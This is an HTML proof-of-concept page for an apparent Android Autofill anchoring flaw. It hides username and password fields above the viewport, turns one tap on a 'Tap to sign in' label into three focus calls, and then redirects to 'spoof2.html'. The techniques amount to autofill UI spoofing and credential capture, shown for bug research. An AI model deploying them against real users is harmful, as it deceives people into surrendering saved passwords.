```html
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, user-scalable=no">

  <title>Android Autofill FillUi out-of-bounds anchor</title>

  <style>
    html,
    body {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
    }

    /*
     * Autofill target positioned above the viewport.
     *
     * The purpose of this PoC is to test whether the negative
     * viewport/widget coordinate is propagated into the Android
     * Autofill UI anchor instead of being clamped.
     */
    #u {
      position: fixed;
      top: -120px;
      left: 0;
      width: 300px;
      height: 40px;
      font-size: 16px;
    }

    #p {
      position: fixed;
      top: -200px;
      left: 0;
      width: 300px;
      height: 40px;
      font-size: 16px;
    }

    /*
     * Visible activation surface.
     */
    #tap {
      position: fixed;
      top: 40px;
      left: 20px;
      right: 20px;

      padding: 18px;

      background: #1a73e8;
      color: #fff;

      font: 18px sans-serif;
      text-align: center;

      border-radius: 6px;
      cursor: pointer;

      user-select: none;
      -webkit-user-select: none;
    }

    #log {
      position: fixed;
      top: 120px;
      left: 20px;
      right: 20px;

      font: 12px monospace;
      white-space: pre-wrap;
    }
  </style>
</head>

<body>

  <form action="/login" method="post" id="f">

    <input
      id="u"
      name="username"
      type="text"
      autocomplete="username">

    <input
      id="p"
      name="password"
      type="password"
      autocomplete="current-password">

  </form>

  <!-- Single physical tap -->
  <label id="tap" for="u">
    Tap to sign in
  </label>

  <pre id="log"></pre>

  <script>
    const log = message => {
      document.getElementById('log').textContent += message + '\n';
    };

    const button = document.getElementById('tap');
    const username = document.getElementById('u');

    button.addEventListener('click', () => {

      log('User activation received.');
      log('Executing autofill focus sequence 3 times...');

      /*
       * One physical tap -> three focus attempts.
       */
      for (let i = 1; i <= 3; i++) {

        username.focus({
          preventScroll: true
        });

        const rect = username.getBoundingClientRect();

        log(
          'Attempt #' + i +
          ': y=' + rect.top +
          ' h=' + rect.height
        );

        log(
          'Viewport=' +
          window.innerWidth +
          'x' +
          window.innerHeight
        );
      }

      log('');
      log('Completed 3 focus attempts from one physical tap.');
      log('Expected target Y coordinate: negative.');

      /*
       * Allow time for the Autofill UI to become visible.
       */
      setTimeout(() => {
        log('Navigating to spoof2.html...');
        document.location = 'spoof2.html';
      }, 6000);
    });
  </script>

</body>
</html>
